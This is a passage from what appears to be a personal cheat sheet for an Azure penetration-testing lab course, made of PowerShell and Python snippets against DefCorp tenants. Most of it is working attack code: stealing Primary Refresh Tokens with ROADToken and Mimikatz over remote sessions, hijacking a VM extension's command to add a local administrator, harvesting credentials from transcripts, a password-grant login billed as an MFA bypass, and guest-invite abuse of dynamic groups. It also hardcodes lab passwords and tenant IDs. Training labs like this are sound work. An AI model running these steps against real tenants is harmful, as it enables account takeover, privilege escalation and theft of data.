Get-MgServicePrincipal -All | ?{$_.AppId -eq $clientId} | fl
```

- Authenticate as a service principal
```
$appId = 'f072c4a6-b440-40de-983f-a7f3bd317d8f'
$password = ConvertTo-SecureString '......' -AsPlainText -Force
$tenantId = '2d50cb29-5f7b-48a4-87ce-fe75a941adb6'
$creds = New-Object System.Management.Automation.PSCredential($appId, $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant $tenantId
```

- Enumerate deployment template 
```
# Define the directory to save deployment templates
$savePath = "C:\windows\Temp\deployments"
if (-not (Test-Path -Path $savePath)) {
    New-Item -ItemType Directory -Path $savePath | Out-Null
}

# Get all resource groups
$resourceGroups = Get-AzResourceGroup

# Iterate over resource groups to find deployments
foreach ($resourceGroup in $resourceGroups) {
    Write-Host "Resource Group: $($resourceGroup.ResourceGroupName)"
    
    # Get all deployments in the resource group
    $deployments = Get-AzResourceGroupDeployment -ResourceGroupName $resourceGroup.ResourceGroupName

    foreach ($deployment in $deployments) {
        Write-Host "Deployment Name: $($deployment.DeploymentName)"
        Write-Host "Provisioning State: $($deployment.ProvisioningState)"
        Write-Host "Template URI: $($deployment.Properties.TemplateLink.Uri)"
        $deployment

        # Save the deployment template locally
        $templateFilePath = Join-Path -Path $savePath -ChildPath "$($deployment.DeploymentName).json"
        try {
            Save-AzResourceGroupDeploymentTemplate -ResourceGroupName $resourceGroup.ResourceGroupName -DeploymentName $deployment.DeploymentName -Path $templateFilePath -Force -ErrorAction Stop
            Write-Host "Template saved at: $templateFilePath"

            # Load the saved template and check for CommandToExecute
            $templateContent = Get-Content -Path $templateFilePath | ConvertFrom-Json
            $resources = $templateContent | Select-Object -ExpandProperty Resources
            foreach ($resource in $resources) {
                if ($resource.resources.properties.Settings -and $resource.resources.Properties.Settings.CommandToExecute) {
                    Write-Host "CommandToExecute found in resource: $($resource.Name)"
                    Write-Host "Command: $($resource.resources.Properties.Settings.CommandToExecute)"
                    Write-Host "------------------------------------"
                }
            }
        } catch {
            Write-Host "Error saving or processing template for deployment: $($deployment.DeploymentName)"
            Write-Host "Error: $_"
            Write-Host "------------------------------------"
        }
    }
}

Write-Host ""
Write-Host "------------------------------------"
Write-Host "Check Template with GUI"
Write-Host "------------------------------------"
```

- Enumerate StorageContainer
```
# Get all storage accounts in the subscription
$storageAccounts = Get-AzStorageAccount

# Iterate through each storage account
foreach ($storageAccount in $storageAccounts) {
    Write-Host "Storage Account Name: $($storageAccount.StorageAccountName)"
    Write-Host "Resource Group: $($storageAccount.ResourceGroupName)"
    Write-Host "Location: $($storageAccount.Location)"
    Write-Host "------------------------------------"

    # Get the storage account context
    $context = New-AzStorageContext -StorageAccountName $storageAccount.StorageAccountName

    # List all containers in the storage account
    $containers = Get-AzStorageContainer -Context $context
    foreach ($container in $containers) {
        Write-Host "  Container Name: $($container.Name)"
        Write-Host "  Public Access Level: $($container.PublicAccess)"
        Write-Host "  ---------------------------"

        # List all blobs in the container
        $blobs = Get-AzStorageBlob -Container $container.Name -Context $context
        foreach ($blob in $blobs) {
            Write-Host "    Blob Name: $($blob.Name) : $($blob.ContentType)"
        }
    }
}

```
- Save blob
```
$containerName = "secrets"
$storageName = "defcorpcodebackup"
$context = New-AzStorageContext -StorageAccountName $storageName

# List all blobs in the container
$blobs = Get-AzStorageBlob -Container $containerName -Context $context
$blob = $blob[0]

# Download each blob
$destination = "C:\Windows\temp\"+$blob.Name

Get-AzStorageBlobContent -Blob $blob.Name `
                             -Container $containerName `
                             -Destination $destination `
                             -Context $context `
                             -Force
```

- Connect to VM 
```
$password = ConvertTo-SecureString 'Stud13Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student13', $password)
$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $jumpvm
```
- Extract user data used by vm 
```
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

```

- Enumerate permissions from Microsoft.Compute/virtualMachines/extensions with ARM API when Get-AzRoleAssignment does not return anything  
```

$Token = (Get-AzAccessToken).Token

# Initialize an array to store unique VMs
$uniqueVMs = @()

# Step 1: Retrieve all resources of type Microsoft.Compute/virtualMachines/extensions
$vmExtensions = Get-AzResource 

# Step 2: Extract unique VM resource IDs
foreach ($extension in $vmExtensions) {
    if($extension.ResourceType -eq "Microsoft.Compute/virtualMachines/extensions"){

        # Parse the parent VM's resource ID from the extension's resource ID
        $vmResourceId = $extension.ResourceId -replace "/extensions/.*", ""
        if (-not ($uniqueVMs -contains $vmResourceId)) {
            $uniqueVMs += $vmResourceId
        }
    }
    
}

# Initialize a list to store results
$results = @()

# Step 3: Fetch permissions for each unique VM
foreach ($vmId in $uniqueVMs) {
    Write-Output "Fetching permissions for VM: $vmId"
    
    # Extract subscription ID and resource group from the VM resource ID
    if ($vmId -match "/subscriptions/(?<subscriptionId>[^/]+)/resourceGroups/(?<resourceGroup>[^/]+)/providers/Microsoft.Compute/virtualMachines/(?<vmName>[^/]+)") {
        $subscriptionId = $matches["subscriptionId"]
        $resourceGroup = $matches["resourceGroup"]
        $vmName = $matches["vmName"]

        # Construct the URI for the permissions API request
        $URI = "https://management.azure.com/subscriptions/$subscriptionId/resourceGroups/$resourceGroup/providers/Microsoft.Compute/virtualMachines/$vmName/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"

        # Make the API request
        $RequestParams = @{
            Method = 'GET'
            Uri = $URI
            Headers = @{
                'Authorization' = "Bearer $Token"
            }
        }

        try {
            $response = Invoke-RestMethod @RequestParams
            $permissions = $response.value

            # Store the permissions in the results list
            $results += [PSCustomObject]@{
                VMName            = $vmName
                ResourceGroup     = $resourceGroup
                SubscriptionId    = $subscriptionId
                Permissions       = ($permissions | ForEach-Object { $_.actions -join ", " }) -join "; "
            }
        } catch {
            Write-Error "Failed to fetch permissions for VM: $vmName. Error: $_"
        }
    }
}

# Step 4: Output the results
if ($results.Count -eq 0) {
    Write-Output "No permissions found for any VM."
} else {
    $results | Format-List
}
```

- Get VmExtention permission
```
# Get all VM extensions
$vmExtensions = Get-AzResource -ResourceType "Microsoft.Compute/virtualMachines/extensions"

# Initialize an array to store results
$results = @()

# Loop through each extension to get its permissions
foreach ($extension in $vmExtensions) {
    Write-Output "Fetching permissions for VM Extension: $($extension.Name)"

    # Construct the permissions API URI
    $uri = "https://management.azure.com$($extension.ResourceId)/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"

    try {
        # Make the REST API call
        $permissions = Invoke-RestMethod -Method GET -Uri $uri -Headers @{
            Authorization = "Bearer $token"
        }

        # Process and store the permissions
        foreach ($permission in $permissions.value) {
            $vmName = (($extension.ResourceId -split "/virtualMachines/")[1] -split "/extensions/"[0])[0]
            $results += [PSCustomObject]@{
                ExtensionName   = $extension.Name
                VMName          = $vmName
                ResourceGroup   = $extension.ResourceGroupName
                Actions         = $permission.actions -join ", "
                NotActions      = $permission.notActions -join ", "
            }
        }
    } catch {
        Write-Error "Failed to fetch permissions for VM Extension: $($extension.Name). Error: $_"
    }
}

# Output the results
if ($results.Count -eq 0) {
    Write-Output "No permissions found for any VM extension."
} else {
    $results | Format-List
}
```

- Edit the "commandToExecute" of a VmExtention
```
$vmExtension = (Get-AzResource -ResourceType "Microsoft.Compute/virtualMachines/extensions")[0]

$commandToExecute = "powershell net users student13 Stud13Password@123 /add /Y; net localgroup administrators student13 /add"

# Build the settings JSON string with properly escaped quotes
$settingsJson = @"
{
    "commandToExecute": "$commandToExecute"
}
"@

$vmName = (($vmExtension.ResourceId -split "/virtualMachines/")[1] -split "/extensions/")[0]
$vmExtensionName = $vmExtension.Name.Split("/")[-1]
$extension = Get-AzVMExtension -ResourceGroupName $vmExtension.ResourceGroupName -VMName $vmName -Name $vmExtensionName
$vmPublisher = $extension.Publisher
$vmExtensionType = $extension.ExtensionType
$TypeHandlerVersion = $extension.TypeHandlerVersion
# Correct the VMName extraction and use the proper JSON string
Set-AzVMExtension `
    -ResourceGroupName $vmExtension.ResourceGroupName `
    -ExtensionName  $vmExtensionName `
    -VMName $vmName `
    -Location $vmExtension.Location `
    -Publisher  $vmPublisher `
    -ExtensionType  $vmExtensionType `
    -TypeHandlerVersion $TypeHandlerVersion `
    -SettingString $settingsJson
```

- Checking hostname ip address
```
$dnsName = "infradminsrv"
Resolve-DnsName -Name $dnsName -Type ANY | Format-Table -AutoSize
```
or 
```
function Get-DnsInfo {
    param (
        [string]$SearchTerm = ""  # Optional parameter to filter the DNS name
    )

    # Get active connections with netstat
    $connections = netstat -ano

    # Regex pattern to match only IP addresses
    $pattern = '(\d{1,3}(\.\d{1,3}){3})'

    # Extract all matches across all lines
    $ipAddresses = @()
    foreach ($line in $connections) {
        if ($line -match $pattern) {
            # Extract all matches within a single line
            $matches = [regex]::Matches($line, $pattern)
            foreach ($match in $matches) {
                $ipAddresses += $match.Groups[1].Value
            }
        }
    }

    # Remove duplicates and resolve DNS names
    $results = @()
    $ipAddresses = $ipAddresses | Sort-Object -Unique
    foreach ($ip in $ipAddresses) {
        try {
            $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
        } catch {
            $hostname = "Unresolved"
        }
        $results += [PSCustomObject]@{
            IPAddress = $ip
            Hostname  = $hostname
        }
    }

    # Filter results based on the search term (if provided)
    if (-not [string]::IsNullOrWhiteSpace($SearchTerm)) {
        $results = $results | Where-Object { $_.Hostname -like "*$SearchTerm*" }
    }

    # Display the filtered results
    $results | Format-Table -AutoSize
}


# Get-DnsInfo
# Get-DnsInfo -SearchTerm "infra"
```

- Execute block script on vm 
```
$password = ConvertTo-SecureString 'Stud13Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('.\student13', $Password)
$infradminsrv = New-PSSession -ComputerName 10.0.1.5 -Credential $creds
Invoke-Command -Session $infradminsrv -ScriptBlock{hostname}
Invoke-Command -Session $infradminsrv -ScriptBlock{whoami}
Invoke-Command -Session $infradminsrv -ScriptBlock{dsregcmd /status}

```
- Extract PRT Cookie using Roadtoken
```
Invoke-Command -Session $infradminsrv -ScriptBlock{mkdir C:\Users\Public\student13}
exit

$source = "C:\AzAD\Tools\"
$destination = "C:\Users\student13.jumpvm\Documents"
$items_to_copy = ('ROADToken.exe', 'PsExec64.exe', 'SessionExecCommand.exe')

foreach ($item in $items_to_copy) {Copy-Item -ToSession $jumpvm -Path ($source+"\"+$item) -Destination $destination  –Verbose}

$password = ConvertTo-SecureString 'Stud13Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student13', $password)
$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $jumpvm

$source = "C:\Users\student13.jumpvm\Documents"
$destination = "C:\Users\Public\student13"
$items_to_copy = ('ROADToken.exe', 'PsExec64.exe', 'SessionExecCommand.exe')

$password = ConvertTo-SecureString 'Stud13Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('.\student13', $Password)
$infradminsrv = New-PSSession -ComputerName 10.0.1.5 -Credential $creds

foreach ($item in $items_to_copy) {Copy-Item -ToSession $infradminsrv -Path ($source+"\"+$item) -Destination $destination  –Verbose}


Invoke-Command -Session $infradminsrv -ScriptBlock{ls C:\Users\Public\student13}

Invoke-Command -Session $infradminsrv -ScriptBlock{quser}
Invoke-Command -Session $infradminsrv -ScriptBlock{Get-Process -IncludeUserName | Where-Object { $_.ProcessName -ne "svchost" -and -not ($_.UserName -like "NT AUTHORITY\*")  -and $_.UserName } | Select-Object UserName, ProcessName | Format-Table -AutoSize}


$TenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"
$Params = @{
"URI" = $URL
"Method" = "POST"
}

$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce

cat he | iconv --to-code UTF-16LE |   base64 -w 0

Invoke-Command -Session $infradminsrv -ScriptBlock{powershell -enc JABUAGUAbgBhAG4AdABJAGQAIAA9ACAAIgAyAGQANQAwAGMAYgAyADkALQA1AGYANwBiAC0ANAA4AGEANAAtADgANwBjAGUALQBmAGUANwA1AGEAOQA0ADEAYQBkAGIANgAiAAoAJABVAFIATAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBsAG8AZwBpAG4ALgBtAGkAYwByAG8AcwBvAGYAdABvAG4AbABpAG4AZQAuAGMAbwBtAC8AJABUAGUAbgBhAG4AdABJAGQALwBvAGEAdQB0AGgAMgAvAHQAbwBrAGUAbgAiAAoAJABQAGEAcgBhAG0AcwAgAD0AIABAAHsACgAiAFUAUgBJACIAIAA9ACAAJABVAFIATAAKACIATQBlAHQAaABvAGQAIgAgAD0AIAAiAFAATwBTAFQAIgAKAH0ACgAKACQAQgBvAGQAeQAgAD0AIABAAHsACgAiAGcAcgBhAG4AdABfAHQAeQBwAGUAIgAgAD0AIAAiAHMAcgB2AF8AYwBoAGEAbABsAGUAbgBnAGUAIgAKAH0ACgAkAFIAZQBzAHUAbAB0ACAAPQAgAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAEAAUABhAHIAYQBtAHMAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBCAG8AZAB5ACAAJABCAG8AZAB5AAoAJABSAGUAcwB1AGwAdAAuAE4AbwBuAGMAZQAKAAoA | Out-File -FilePath "C:\Windows\Temp\nonce.txt"}
Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student13\PsExec64.exe -accepteula -s "cmd.exe" " /c cd C:\Users\Public\student13\ && SessionExecCommand.exe MichaelMBarron ROADToken.exe $(gc C:\Windows\Temp\nonce.txt) > MichaelMBarron_PRT.txt"}
Invoke-Command -Session $infradminsrv -ScriptBlock{gc C:\Users\Public\student13\MichaelMBarron_PRT.txt}
```
Open chrome at [https://login.microsoftonline.com/login.srf], delete all cookies and set x-ms-RefreshTokenCredential with the appropriate value
Intune link at [https://endpoint.microsoft.com/]


- Extract PRT using Mimikatz and use with roadtx
```
Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\mimikatz.exe -Destination C:\Users\student13\Documents -Verbose
Copy-Item -ToSession $infradminsrv -Path C:\Users\student13\Documents\mimikatz.exe -Destination C:\Users\Public\student13 -Verbose


$Session = $infradminsrv
$MimikatzPath = "C:\Users\Public\student13\mimikatz.exe"

# Function to extract Value 
function Get-RegexValue {
    param(
    	[string]$regex,
        [string]$Output
    )
    # Use regex to extract the keyvalue from the output
    if ($Output -match $regex) {
        return $matches[1]
    } else {
        throw "Value not found in the output"
    }
}

# Step 1: Run Mimikatz to retrieve KeyValue
$KeyValueOutput = Invoke-Command -Session $Session -ScriptBlock {
    param($MimikatzPath)
    & $MimikatzPath sekurlsa::cloudap exit
} -ArgumentList $MimikatzPath

# Extract the KeyValue from the output
try {
    $KeyValue = Get-RegexValue -regex '"KeyValue":"([\w+\-]+)"' -Output $KeyValueOutput
    Write-Host "Extracted KeyValue: $KeyValue"
} catch {
    Write-Error "Failed to extract KeyValue: $_"
    exit 1
}

# Step 2: Use the extracted KeyValue in the next command
$KeyOutput = Invoke-Command -Session $Session -ScriptBlock {
    param($MimikatzPath, $KeyValue)
    & $MimikatzPath "token::elevate" "dpapi::cloudapkd /keyvalue:$KeyValue /unprotect" "exit"
} -ArgumentList $MimikatzPath, $KeyValue

# Extract the PRT from the output
try {
    $Prt = Get-RegexValue -regex '"Prt":"([\w+\-]+)"' -Output $KeyValueOutput
    Write-Host "Extracted Prt: $Prt"
} catch {
    Write-Error "Failed to Prt KeyValue: $_"
    exit 1
}

try {
    $keySession = Get-RegexValue -regex 'Clear[ ]+key[ ]+:[ ]+(\w+)' -Output $KeyOutput
    Write-Host "Extracted KeyValue: $keySession"
} catch {
    Write-Error "Failed to extract Clear text key: $_"
    exit 1
}
```

```
cd C:\AzAD\Tools\ROADTools
.\venv\Scripts\activate
$ptr = "..."
$sessionkey = "..."
roadtx prt -a renew --prt $ptr --prt-sessionkey $sessionkey
roadtx browserprtauth -url https://portal.azure.com

#or request access tokens for ARM
$accesstoken = (roadtx prtauth -c azps -r azrm --tokens-stdout | ConvertFrom-Json).AccessToken
$graphtoken = (roadtx prtauth -c azps -r msgraph --tokens-stdout | ConvertFrom-Json).AccessToken
$accountid = "michaelmbarron@defcorphq.onmicrosoft.com"

Connect-AzAccount -AccessToken $accesstoken -MicrosoftGraphAccessToken $graphtoken -AccountId $accountid
```

- Extracting credentials from PowerShell Transcript
```
cat (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Get-ChildItem -Path "C:\" -Recurse -Include *PowerShell_transcript*.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "`nPath: $($_.FullName)" -ForegroundColor Yellow; Get-Content $_.FullName | Write-Host -ForegroundColor Cyan }


$Password = ConvertTo-SecureString 'UserIntendedToManageSyncWithCl0ud!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('adconnectadmin', $Password)
Enter-PSSession -ComputerName defres-adcnct -Credential $creds
```

- Bypass MFA by login remotely with a credential using python
```
; python -c "import http.client, json; client_id, tenant_id, username,password = '04b07795-8ddb-461a-bbee-02f9e1bf7b46', 'b6e0615d-2c17-46b3-922c-491c91624acd', 'thomasebarlow@defcorpit.onmicrosoft.com', r'DeployM3ntUserInTh3Tan3nt!!'; scope = 'openid profile offline_access https://graph.microsoft.com/.default'; body = f'client_id={client_id}%26grant_type=password%26username={username}%26password={password}%26scope={scope}%26client_info=1'; headers = {'Content-Type':'application/x-www-form-urlencoded'}; conn =http.client.HTTPSConnection('login.microsoftonline.com');conn.request('POST', f'/{tenant_id}/oauth2/v2.0/token', body, headers);response = conn.getresponse(); status_code = response.status; data =json.loads(response.read()); conn.close(); print(status_code)";
```

- Enumerate dynamic group 
- Python script
```
# This script is a part of Attacking and Defending Azure - Beginner's Edition course by Altered Security
# https://www.alteredsecurity.com/azureadlab

import http.client
import json

def get_access_token_with_username_password(client_id, tenant_id, username, password):

    scope = "openid profile offline_access https://graph.microsoft.com/.default"
    
    # Prepare the body for the POST request
    body = f"client_id={client_id}&grant_type=password&username={username}&password={password}&scope={scope}&client_info=1"

    
    # Prepare headers
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    
    # Send the request
    conn = http.client.HTTPSConnection("login.microsoftonline.com")
    conn.request("POST", f"/{tenant_id}/oauth2/v2.0/token", body, headers)
    
    response = conn.getresponse()
    data = response.read()
    conn.close()

    # Parse and print the access token
    token_response = json.loads(data)
    
    if "access_token" in token_response:
        access_token = token_response['access_token']
        print("[+] Access token acquired successfully.")
        
        # Call the function to list all groups
        list_groups(access_token)
    else:
        print(f"[-] Failed to acquire token: {token_response.get('error_description')}")
        return None

def list_groups(access_token):
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }
    
    # Parse the URL for the Graph API
    conn = http.client.HTTPSConnection("graph.microsoft.com")
    
    # Send the request to get the list of groups
    conn.request("GET", "/v1.0/groups", headers=headers)
    response = conn.getresponse()
    
    if response.status == 200:
        groups_data = response.read().decode('utf-8')
        groups = json.loads(groups_data).get('value', [])
        
        # Iterate through each group and get membership details
        for group in groups:
            group_id = group['id']
            group_name = group['displayName']
            group_type = group.get('groupTypes', [])
            membership_rule = group.get('membershipRule', None)
            
            print(f"\nGroup Name: {group_name}, Group Type: {group_type}")
            
            # Print the dynamic group rule if it exists
            if membership_rule:
                print(f"Membership Rule: {membership_rule}")
            else:
                pass
            
            # Get group members
            members_url = f"/v1.0/groups/{group_id}/members"
            conn.request("GET", members_url, headers=headers)
            members_response = conn.getresponse()
            
            if members_response.status == 200:
                members_data = members_response.read().decode('utf-8')
                members = json.loads(members_data).get('value', [])
                print(f"Members of {group_name}:")
                for member in members:
                    print(f" - {member.get('displayName')} ({member.get('userPrincipalName')})")
            else:
                print(f"[-] Failed to get members for group {group_name}: {members_response.status}")
    else:
        print(f"[-] Failed to get groups: {response.status} {response.read().decode('utf-8')}")
    
    # Close the connection
    conn.close()


def main():
    # Example usage
    client_id = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" # Public Client ID for Az CLI
    tenant_id = "b6e0615d-2c17-46b3-922c-491c91624acd" # Tenant ID of DefCorp IT
    username = "thomasebarlow@defcorpit.onmicrosoft.com" 
    password = r"LatestPasswordforThomas" # Remember to change this

    get_access_token_with_username_password(client_id, tenant_id, username, password)

if __name__ == '__main__':
    main()
```

`; python /tmp/uploads/enumerate_dynamic_groups_x/enumerate_dynamic_groups_x.py ;`
- Powershell
```
Connect-MgGraph -Scopes "Group.Read.All"

# Get all groups with dynamic membership rules
$dynamicGroups = Get-MgGroup -Filter "groupTypes/any(c:c eq 'DynamicMembership')"

# Iterate through each dynamic group
foreach ($group in $dynamicGroups) {
    Write-Host "Group Name: $($group.DisplayName)" -ForegroundColor Cyan
    Write-Host "Group ID: $($group.Id)"
    
    # Display dynamic membership rules
    if ($group.MembershipRule) {
        Write-Host "Dynamic Membership Rule: $($group.MembershipRule)" -ForegroundColor Green
        Write-Host "Rule Processing State: $($group.MembershipRuleProcessingState)" -ForegroundColor Yellow
    } else {
        Write-Host "No dynamic membership rule found for this group." -ForegroundColor Red
    }
    
    # Fetch members of the dynamic group
    Write-Host "Group Members:" -ForegroundColor Magenta
    $members = Get-MgGroupMember -GroupId $group.Id -All
    
    # Display members
    foreach ($member in $members) {
        Write-Host " - $($member.DisplayName) ($($member.Id))"
    }
    
    Write-Host "`n" # New line for readability
}
```

- Invite user as a guest user
- Python script
```
	# This script is a part of Attacking and Defending Azure - Beginner's Edition course by Altered Security
# https://www.alteredsecurity.com/azureadlab

import http.client
import json
import argparse

def get_access_token_with_username_password(client_id, tenant_id, username, password):

    scope = "openid profile offline_access https://graph.microsoft.com/.default"
    
    # Prepare the body for the POST request
    body = f"client_id={client_id}&grant_type=password&username={username}&password={password}&scope={scope}&client_info=1"
    
    # Prepare headers
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    
    # Send the request
    conn = http.client.HTTPSConnection("login.microsoftonline.com")
    conn.request("POST", f"/{tenant_id}/oauth2/v2.0/token", body, headers)
    
    response = conn.getresponse()
    data = response.read()
    conn.close()

    # Parse and print the access token
    token_response = json.loads(data)
    
    if "access_token" in token_response:
        access_token = token_response['access_token']
        print("[+] Access token acquired successfully.")
        
        return access_token
    else:
        print(f"[-] Failed to acquire token: {token_response.get('error_description')}")
        return None


def invite_guest(access_token, external_username_email):

    print("[+] Inviting user...")
    # Set up the connection to Microsoft Graph
    conn = http.client.HTTPSConnection("graph.microsoft.com")

    # Define the API endpoint
    endpoint = "/v1.0/invitations"

    # Define the headers, including the Authorization header with the provided access token
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    # Define the body with the email of the guest and some additional optional parameters
    body = {
        "invitedUserEmailAddress": external_username_email,
        "inviteRedirectUrl": f"https://portal.azure.com",  # Update this URL to the actual app redirect URL
        "sendInvitationMessage": True,  # This will send the invite email to the user
        "invitedUserMessageInfo": {
            "customizedMessageBody": "You are invited to collaborate on DefCorp External project." # Update this message to your own message
        }
    }

    # Convert the body to a JSON string
    body_json = json.dumps(body)

    # Send the POST request to the Microsoft Graph API
    conn.request("POST", endpoint, body_json, headers)

    # Get the response from the server
    response = conn.getresponse()

    # Read the response data
    data = response.read()

    # Check if the request was successful
    if response.status == 201:
        # Parse the response data
        invitation_data = json.loads(data)
        invitation_link = invitation_data.get("inviteRedeemUrl")
        object_id = invitation_data.get("invitedUser", {}).get("id")
        print("[+] User invited successfully.\n")
        print(f"Object ID: {object_id}")
        print(f"Invitation link: {invitation_link}")
        return invitation_link
    else:
        # Print the error message if the request failed
        print("[-] Failed to invite user.")
        print(f"[-] Error {response.status}: {data.decode('utf-8')}")
        return None


def main():

    parser = argparse.ArgumentParser(description='Azure AD B2B Guest Invitation Script')
    # Add option to input external user email via argument
    parser.add_argument('--external-user', type=str, help='External user email to invite')

    # Parse command-line arguments
    args = parser.parse_args()

    if args.external_user:
        external_username_email = args.external_user
    else:
        external_username_email = "studentx@defcorpextcontractors.onmicrosoft.com" # Add your own user email here.
        if not external_username_email:
            raise ValueError("External user email not provided")

    # Example usage
    client_id = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" # Public Client ID for Az CLI
    tenant_id = "b6e0615d-2c17-46b3-922c-491c91624acd" # Tenant ID of DefCorp IT
    username = "thomasebarlow@defcorpit.onmicrosoft.com" 
    password = r'DeployM3ntUserInTh3Tan3nt!!' # Remember to change this

    # Get the access token using the username and password
    access_token = get_access_token_with_username_password(client_id, tenant_id, username, password)

    if access_token:
        invite_guest(access_token, external_username_email)
    else:
        print("[-] Failed to get access token.")
        exit()

if __name__ == '__main__':
    main()

```
`python /tmp/uploads/invite_guest_x/invite_guest_x.py --external-user student13@defcorpextcontractors.onmicrosoft.com`

- Powershell
```
function Invite-UserAsGuestUser {
    param (
        [Parameter(Mandatory=$true)]
        [string]$GroupId,  # Dynamic group ID

        [Parameter(Mandatory=$true)]
        [string]$InvitedUserEmail,  # Email address of the user to invite

        [Parameter(Mandatory=$true)]
        [string]$RedirectUrl  # URL to redirect after invitation acceptance
    )

    # Import Microsoft Graph PowerShell Module if not already installed
    if (-not (Get-Module -ListAvailable -Name Microsoft.Graph)) {
        Write-Host "Installing Microsoft Graph Module..." -ForegroundColor Yellow
        Install-Module -Name Microsoft.Graph -Scope CurrentUser -Force
    }
    Import-Module Microsoft.Graph

    # Connect to Microsoft Graph
    Write-Host "Connecting to Microsoft Graph..." -ForegroundColor Cyan
    Connect-MgGraph -Scopes "User.Invite.All", "Group.ReadWrite.All"

    try {
        # Step 1: Invite the user
        Write-Host "Inviting user: $InvitedUserEmail..." -ForegroundColor Cyan
        $invitation = New-MgInvitation -InvitedUserEmailAddress $InvitedUserEmail `
                                        -InviteRedirectUrl $RedirectUrl `
                                        -SendInvitationMessage $true

        if ($invitation) {
            Write-Host "[+] Invitation sent successfully." -ForegroundColor Green
            Write-Host "Invited User Display Name: $($invitation.InvitedUserDisplayName)"
        } else {
            Write-Host "[-] Failed to send invitation." -ForegroundColor Red
            return
        }

        # Step 2: Get the invited user details
        Write-Host "Retrieving user details for: $InvitedUserEmail..." -ForegroundColor Cyan
        $user = Get-MgUser -Filter "mail eq '$($InvitedUserEmail)'"

        # Step 3: Update user attributes to match dynamic group criteria
        if ($user) {
            Write-Host "Updating user attributes to match dynamic group criteria..." -ForegroundColor Cyan

            # Update otherMails to include "vendor"
            Update-MgUser -UserId $user.Id -OtherMails @("vendor@someemail.com")
            
            # Ensure userType is set to 'Guest'
            Update-MgUser -UserId $user.Id -UserType "Guest"

            Write-Host "[+] User attributes updated successfully." -ForegroundColor Green
        } else {
            Write-Host "[-] User not found. Please check the invitation status." -ForegroundColor Red
        }
    }
    finally {
        # Disconnect from Microsoft Graph
        Write-Host "Disconnecting from Microsoft Graph..." -ForegroundColor Cyan
        Disconnect-MgGraph
    }
}

```

```
# Main script

# Define parameters
$GroupId = "YOUR_DYNAMIC_GROUP_ID"  # Replace with your dynamic group's Object ID
$InvitedUserEmail = "newuser@vendor.com"  # Replace with the user's email address
$RedirectUrl = "https://myapp.contoso.com"  # Replace with your redirect URL

# Call the function
Invite-UserToDynamicGroup -GroupId $GroupId `
                          -InvitedUserEmail $InvitedUserEmail `
                          -RedirectUrl $RedirectUrl

```

- Get self user details (user email here should not be a guest email, should be real aad user domain email)
```
Connect-MgGraph -Scopes "User.Read"
$email = "student13@defcorpextcontractors.onmicrosoft.com"
Get-MgUser -UserId $email | fl
```

- Update user param
```
$domain = "defcorpit.onmicrosoft.com"
Connect-AzAccount -TenantId (Get-AADIntTenantID -Domain $domain)
$graphtoken = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Connect-MgGraph -AccessToken ($graphtoken | ConvertTo-SecureString -AsPlainText -Force)

$userid = "f5230ce7-5675-4ffd-80e7-463b258ae350"
$useremail = "student13_defcorpextcontractors.onmicrosoft.com#EXT#@defcorpit.onmicrosoft.com"

Update-MgUser -UserId $userid -OtherMails vendor13@defcorpextcontractors.onmicrosoft.com -Verbose
Update-MgUser -UserId $useremail  -OtherMails vendorx@defcorpextcontractors.onmicrosoft.com -Verbose
```

- Guest email convertor
```
function Convert-ToGuestEmail {
    param (
        [Parameter(Mandatory=$true)]
        [string]$UserEmail,

        [Parameter(Mandatory=$true)]
        [string]$Domain
    )

    # Split the email into username and domain
    $username, $userDomain = $UserEmail -split '@'

    # Replace the '@' in the domain part with an underscore
    $sanitizedDomain = $userDomain -replace '@', '_'

    # Construct the guest email address
    $guestEmail = "${username}_${sanitizedDomain}#EXT#@${Domain}.onmicrosoft.com"

    return $guestEmail
}

# Example usage:
$email = "student13@defcorpextcontractors.onmicrosoft.com"
$domain = "defcorpit"
$guestEmail = Convert-ToGuestEmail -UserEmail $email -Domain $domain
Write-Output $guestEmail

```

- Enumerate MgApplicationProxyApplication
```
$domain = "defcorphq.onmicrosoft.com"
Connect-AzAccount -TenantId (Get-AADIntTenantID -Domain $domain)

$graphtoken = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Connect-MgGraph -AccessToken ($graphtoken | ConvertTo-SecureString -AsPlainText -Force)

. C:\AzAD\Tools\Get-MgApplicationProxyApplication.ps1
```
```
function Get-MgApplicationProxyApplication {
